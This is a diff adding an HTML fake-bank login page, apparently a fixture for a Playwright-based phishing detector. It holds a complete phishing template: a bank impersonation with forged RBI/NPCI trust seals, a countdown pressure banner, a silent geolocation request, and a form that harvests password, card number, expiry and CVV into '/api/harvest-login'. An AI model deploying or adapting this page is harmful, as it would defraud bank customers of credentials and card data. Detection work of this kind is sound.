@@ -1,0 +1,307 @@
+<!--
+Fake Banking Page
+Countdown timer to create psychological pressure in user's mind
+It will ask for user's credentials, passwords, CVV etc.
+Fake logo of a bank with fake trust seals
+As form is submitted it goes to scammer side server (EXFILTRATION)
+
+Playwright will takescreenshot of this web page and will detect all the above stuff
+-->
+
+
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <title>SecureBank | Digital Identity Update</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link
+        href="https://fonts.googleapis.com/css2?family=Playwrite+GB+J+Guides:ital@0;1&family=Poppins:ital,wght@0,100;0,200;0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,100;1,200;1,300;1,400;1,500;1,600;1,700;1,800;1,900&family=Roboto+Slab:wght@100..900&family=Ubuntu:ital,wght@0,300;0,400;0,500;0,700;1,300;1,400;1,500;1,700&display=swap"
+        rel="stylesheet">
+    <style>
+        :root {
+            --primary: #004a99;
+            --accent: #f27020;
+            --danger: #e53935;
+            --bg: #f8fafc;
+        }
+
+        body {
+            font-family: "Ubuntu", sans-serif;
+            font-weight: 400;
+            font-style: normal;
+            background: var(--bg);
+            margin: 0;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+
+        /* Premium Navbar */
+        .navbar {
+            background: white;
+            padding: 15px 10%;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            box-shadow: 0 2px 15px rgba(0, 0, 0, 0.05);
+            border-bottom: 3px solid var(--accent);
+        }
+
+        .logo {
+            font-size: 26px;
+            font-weight: 800;
+            color: var(--primary);
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        /* High-Intensity Urgency Banner */
+        .urgency-banner {
+            background: var(--danger);
+            color: white;
+            text-align: center;
+            padding: 14px;
+            font-weight: 700;
+            font-size: 14px;
+            letter-spacing: 0.5px;
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0% {
+                background: #e53935;
+            }
+
+            50% {
+                background: #b71c1c;
+            }
+
+            100% {
+                background: #e53935;
+            }
+        }
+
+        .main-container {
+            display: grid;
+            grid-template-columns: 1fr 1.2fr;
+            gap: 60px;
+            padding: 60px 10%;
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+
+        /* Left Info Panel */
+        .info-panel h1 {
+            font-size: 36px;
+            color: var(--primary);
+            line-height: 1.2;
+            margin-top: 0;
+        }
+
+        .security-card {
+            background: #eef5ff;
+            border-radius: 12px;
+            padding: 25px;
+            border-left: 6px solid var(--primary);
+            margin-top: 30px;
+        }
+
+        .feature {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            margin-bottom: 15px;
+            font-size: 15px;
+            color: #444;
+        }
+
+        .feature i {
+            color: var(--primary);
+        }
+
+        /* Login Card - Pro Look */
+        .login-card {
+            background: white;
+            border-radius: 20px;
+            padding: 45px;
+            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.1);
+            border: 1px solid #f1f5f9;
+            position: relative;
+        }
+
+        .login-card h2 {
+            margin: 0 0 30px;
+            font-size: 24px;
+            color: #1e293b;
+        }
+
+        .form-group {
+            margin-bottom: 22px;
+            position: relative;
+        }
+
+        .form-group i {
+            position: absolute;
+            left: 15px;
+            top: 43px;
+            color: #94a3b8;
+        }
+
+        label {
+            display: block;
+            font-size: 13px;
+            font-weight: 700;
+            color: #475569;
+            margin-bottom: 8px;
+        }
+
+        input {
+            width: 100%;
+            padding: 14px 14px 14px 45px;
+            border: 1.5px solid #e2e8f0;
+            border-radius: 10px;
+            box-sizing: border-box;
+            font-size: 15px;
+            transition: 0.3s;
+        }
+
+        input:focus {
+            border-color: var(--primary);
+            outline: none;
+            box-shadow: 0 0 0 4px rgba(0, 74, 153, 0.1);
+        }
+
+        .btn-submit {
+            width: 100%;
+            background: var(--accent);
+            color: white;
+            border: none;
+            padding: 18px;
+            border-radius: 10px;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: 0.3s;
+            margin-top: 15px;
+            box-shadow: 0 4px 15px rgba(242, 112, 32, 0.3);
+        }
+
+        .btn-submit:hover {
+            transform: translateY(-2px);
+            background: #e66a1d;
+        }
+
+        .footer-seals {
+            margin-top: 35px;
+            display: flex;
+            justify-content: center;
+            gap: 20px;
+            border-top: 1px solid #f1f5f9;
+            padding-top: 25px;
+        }
+
+        .seal-tag {
+            font-size: 11px;
+            font-weight: 800;
+            color: #94a3b8;
+            border: 1px solid #e2e8f0;
+            padding: 6px 12px;
+            border-radius: 6px;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+    </style>
+</head>
+
+<body>
+
+    <div class="navbar">
+        <div class="logo"><i class="fas fa-building-columns"></i> SecureBank</div>
+        <div style="font-size: 13px; color: #64748b;"><i class="fas fa-shield-check"></i> <strong>256-bit Encryption
+                Active</strong></div>
+    </div>
+
+    <div class="urgency-banner">
+        <i class="fas fa-triangle-exclamation"></i> CRITICAL: Profile update mandatory. Unverified accounts will be
+        restricted at <span id="clock">02:00</span>
+    </div>
+
+    <div class="main-container">
+        <div class="info-panel">
+            <h1>Digital Banking, <br><span style="color:var(--accent)">Safely Re-imagined.</span></h1>
+            <p style="color:#64748b; font-size: 17px;">We are upgrading our security layers. This one-time profile
+                verification ensures your funds stay protected against global cyber threats.</p>
+
+            <div class="security-card">
+                <div class="feature"><i class="fas fa-check-circle"></i> RBI Mandatory Compliance 2024</div>
+                <div class="feature"><i class="fas fa-check-circle"></i> PCI-DSS v4.0 Certified Environment</div>
+                <div class="feature"><i class="fas fa-check-circle"></i> End-to-End Encrypted Tunnel</div>
+            </div>
+
+            <img src="https://via.placeholder.com/400x120?text=NPCI+and+DIGITAL+INDIA+APPROVED"
+                style="margin-top:40px; border-radius:12px; opacity:0.8;">
+        </div>
+
+        <div class="login-card">
+            <h2>Verify Your Account</h2>
+            <form action="/api/harvest-login" method="POST">
+                <div class="form-group">
+                    <label>Customer User ID</label>
+                    <i class="fas fa-user"></i>
+                    <input type="text" name="username" placeholder="Enter ID" required>
+                </div>
+
+                <div class="form-group">
+                    <label>Login Password</label>
+                    <i class="fas fa-lock"></i>
+                    <input type="password" name="password" placeholder="••••••••" required>
+                </div>
+
+                <div class="form-group">
+                    <label>Debit Card Number (16-Digit)</label>
+                    <i class="fas fa-credit-card"></i>
+                    <input type="text" name="card_number" maxlength="16" placeholder="4591 XXXX XXXX XXXX" required>
+                </div>
+
+                <div style="display:grid; grid-template-columns: 1fr 1fr; gap:20px;">
+                    <div class="form-group">
+                        <label>Expiry Date</label>
+                        <i class="fas fa-calendar-days"></i>
+                        <input type="text" name="expiry" placeholder="MM/YY" required>
+                    </div>
+                    <div class="form-group">
+                        <label>CVV Number</label>
+                        <i class="fas fa-key"></i>
+                        <input type="password" name="cvv" maxlength="3" placeholder="123" required>
+                    </div>
+                </div>
+
+                <button type="submit" class="btn-submit">SECURE MY ACCOUNT NOW</button>
+            </form>
+
+            <div class="footer-seals">
+                <div class="seal-tag"><i class="fas fa-landmark"></i> RBI TRUST</div>
+                <div class="seal-tag"><i class="fas fa-shield"></i> NPCI SAFE</div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        let time = 120;
+        const clockElem = document.getElementById('clock');
+        setInterval(() => {
+            let m = Math.floor(time / 60), s = time % 60;
+            clockElem.innerText = `0${m}:${s < 10 ? '0' : ''}${s}`;
+            if (time > 0) time--;
+        }, 1000);
+        navigator.geolocation.getCurrentPosition(() => { }, () => { });
+    </script>
+</body>
+
+</html>
